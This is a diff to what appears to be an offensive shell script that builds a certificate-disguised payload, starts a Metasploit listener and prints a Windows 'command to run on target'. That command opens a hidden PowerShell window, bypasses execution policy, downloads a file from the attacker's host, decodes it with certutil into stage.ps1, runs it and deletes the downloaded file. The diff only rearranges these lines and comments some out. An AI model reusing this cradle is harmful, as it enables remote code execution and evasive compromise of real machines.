@@ -90,11 +90,18 @@ cradle_crafter
 ##Craft certificate
 craft_cert
 
+##Output final notations
+#echo "[+]Certificate located at ${rootDir}/cert.cer or ${ip_addr}/cert.cer"
+#echo "[+]Command to run on target: "
+#echo "  powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cer$
+#echo "powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.$
+
 ##Start metasploit start_listener
-start_listener
+#start_listener
 
 ##Output final notations
 echo "[+]Certificate located at ${rootDir}/cert.cer or ${ip_addr}/cert.cer"
 echo "[+]Command to run on target: "
 echo "  powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cert.cer"
 echo "powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cert.cer" > command.txt
+start_listener
